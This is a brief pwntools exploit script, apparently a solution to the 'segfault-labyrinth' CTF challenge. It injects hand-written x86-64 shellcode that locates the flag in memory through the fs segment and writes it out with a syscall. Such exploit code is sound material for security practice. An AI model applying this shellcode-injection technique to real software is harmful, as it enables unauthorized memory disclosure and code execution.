#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./challenge', checksec=False)

if args.REMOTE:
	p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
	p = process(binary.path)

shellcode = asm(f'''
mov rsi, qword ptr [fs:0x300]
mov rsi, qword ptr [rsi - 0x2f0]
{ 'xor rdi, rdi' if args.REMOTE else 'mov rdi, 1' }
mov dl, 100
mov al, {constants.SYS_write}
syscall
mov al, {constants.SYS_exit}
syscall
''')

if args.D:
	print(disasm(shellcode))
	log.info('len(shellcode) = {x}'.format(x = len(shellcode)))

assert(len(shellcode) < 0x1000)
p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
p.send(shellcode)
_ = p.recvline().decode().strip()
p.close()
print(_)
